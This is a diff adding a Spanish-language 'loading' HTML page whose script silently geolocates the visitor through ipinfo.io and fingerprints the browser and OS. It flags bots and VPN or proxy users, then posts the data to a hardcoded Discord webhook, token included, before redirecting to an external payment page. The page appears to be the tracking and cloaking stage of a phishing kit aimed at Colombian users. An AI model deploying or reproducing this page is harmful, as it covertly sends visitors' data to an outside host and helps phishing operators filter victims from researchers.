@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Cargando…</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  html,body{margin:0;height:100%;display:flex;align-items:center;justify-content:center;background:#fff}
+  #loader{width:120px;height:120px}
+</style>
+</head>
+<body>
+
+<img id="loader" src="loading.gif" alt="Cargando…">
+
+<script>
+/* ========= CONFIG ========= */
+const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1417919457531138140/KtlzGO1YiHNBuJJeQ14WJV6-ELG1cY8ML6fUBS3eiYuWF1xQ-eRZfcW0qPQFo6ALncbo';
+const REDIR_URL   = 'https://energyvicosta.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9';
+/* ========================== */
+
+(async () => {
+  const UA = navigator.userAgent;
+  const esBot = /bot|crawler|spider|curl|wget|scraping/i.test(UA);
+
+  /* ---------- GEO + ORG ---------- */
+  const { country = 'XX', city = 'Desconocida', org = '' } = await fetch('https://ipinfo.io/json')
+    .then(r => r.json())
+    .catch(() => ({}));
+
+  /* ---------- PROXY / VPN ---------- */
+  const esProxy = /vpn|proxy|hosting|datacenter|cloud/i.test(org);
+
+  /* ---------- NAVEGADOR ---------- */
+  let navegador = 'Desconocido';
+  if (/edg\//i.test(UA)) navegador = 'Edge';
+  else if (/brave/i.test(UA)) navegador = 'Brave';
+  else if (/opera|opr\//i.test(UA)) navegador = 'Opera';
+  else if (/chrome|chromium/i.test(UA) && !/edge|opr\//i.test(UA)) navegador = 'Chrome';
+  else if (/safari/i.test(UA) && !/chrome|chromium/i.test(UA)) navegador = 'Safari';
+  else if (/firefox|fxios/i.test(UA)) navegador = 'Firefox';
+
+  /* ---------- SISTEMA OPERATIVO ---------- */
+  let so = 'Desconocido';
+  if (/windows nt 10/i.test(UA)) so = 'Windows 10/11';
+  else if (/windows nt 6.3/i.test(UA)) so = 'Windows 8.1';
+  else if (/windows nt 6.2/i.test(UA)) so = 'Windows 8';
+  else if (/windows nt 6.1/i.test(UA)) so = 'Windows 7';
+  else if (/macintosh|mac os x/i.test(UA)) so = 'macOS';
+  else if (/kali/i.test(UA)) so = 'Kali Linux';
+  else if (/ubuntu/i.test(UA)) so = 'Ubuntu';
+  else if (/linux/i.test(UA)) so = 'Linux';
+  else if (/android/i.test(UA)) so = 'Android';
+  else if (/iphone|ipad/i.test(UA)) so = 'iOS';
+
+  /* ---------- FECHA / HORA ---------- */
+  const ahora = new Date();
+  const fechaHora = ahora.toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+  /* ---------- CONTADOR DIARIO ---------- */
+  const hoy = ahora.toISOString().slice(0, 10);
+  const clave = `ingresos_${hoy}`;
+  let num = parseInt(localStorage.getItem(clave) || '0', 10);
+  num += 1;
+  localStorage.setItem(clave, num.toString());
+
+  /* ---------- EMBED ---------- */
+  const embed = {
+    color: esBot ? 0xff0000 : (esProxy ? 0xff9900 : (country === 'CO' ? 0x00ff00 : 0x0099ff)),
+    title: esBot ? '🤖 Bot detectado' : (esProxy ? '🕵️ Proxy/VPN detectado' : (country === 'CO' ? '✅ Humano en Colombia' : '❌ Humano fuera de Colombia')),
+    thumbnail: { url: 'https://i.postimg.cc/fyZQ1Dyy/coolcloud-icono.png' },
+    fields: [
+      { name: '📅 Fecha y hora', value: fechaHora, inline: true },
+      { name: '🔢 Ingreso del día', value: `#${num}`, inline: true },
+      { name: '🌍 Ubicación', value: `${city}, ${country === 'CO' ? 'Colombia' : country}`, inline: true },
+      { name: '🌐 Navegador', value: navegador, inline: true },
+      { name: '💻 Sistema Operativo', value: so, inline: true },
+      { name: '📡 Organización', value: org || 'Sin datos', inline: true }
+    ],
+    footer: { text: 'Sistema de ingresos' },
+    timestamp: new Date().toISOString()
+  };
+
+  await fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ embeds: [embed] })
+  });
+
+  /* ---------- REDIRECCIÓN ---------- */
+  setTimeout(() => {
+    location.href = REDIR_URL;
+  }, 4000);
+})();
+</script>
+</body>
+</html>
